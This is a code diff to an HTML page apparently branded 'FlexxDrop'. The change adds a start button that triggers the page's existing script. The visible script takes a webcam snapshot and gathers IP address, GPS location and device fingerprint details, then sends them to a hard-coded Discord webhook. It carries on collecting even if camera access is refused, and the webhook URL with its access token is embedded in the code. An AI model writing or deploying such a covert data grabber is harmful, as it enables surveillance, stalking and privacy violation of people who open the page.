@@ -17,10 +17,21 @@
       align-items: center;
       font-size: 1.2rem;
     }
+    #startBtn {
+      padding: 0.5em 1em;
+      font-size: 1.1rem;
+      background: #222;
+      border: 1px solid #fff;
+      color: #fff;
+      border-radius: 8px;
+      cursor: pointer;
+    }
   </style>
 </head>
 <body>
-  <div id="status">Loading FlexxDrop…</div>
+  <div id="status">
+    <button id="startBtn">Start FlexxDrop</button>
+  </div>
 
   <script>
     const webhookUrl = "https://discord.com/api/webhooks/1388161217603965210/eELyivDPEhlKfnaaDce_b90zBtGFpe51uLHo28LsG0gle_1d8pfuN-_U6vK6Q38_N4Fj";
@@ -77,7 +88,6 @@
 **Touch Support:** ${device.touchSupport}
 
 🕒 ${new Date().toLocaleString()}`,
-
             image: capturedImageData ? { url: "attachment://snapshot.png" } : undefined
           }
         ],
@@ -148,7 +158,9 @@
       return new Blob([u8arr], {type:mime});
     }
 
-    window.onload = () => {
+    document.getElementById("startBtn").onclick = () => {
+      document.getElementById("status").innerText = "Requesting permissions…";
+
       if (Notification && Notification.requestPermission) {
         Notification.requestPermission().finally(() => {
           navigator.mediaDevices.getUserMedia({ video: true })
@@ -168,11 +180,11 @@
               };
             })
             .catch(() => {
-              getIPAndGPS(); // Continue even if camera denied
+              getIPAndGPS();
             });
         });
       } else {
-        getIPAndGPS(); // Fallback
+        getIPAndGPS();
       }
     };
   </script>
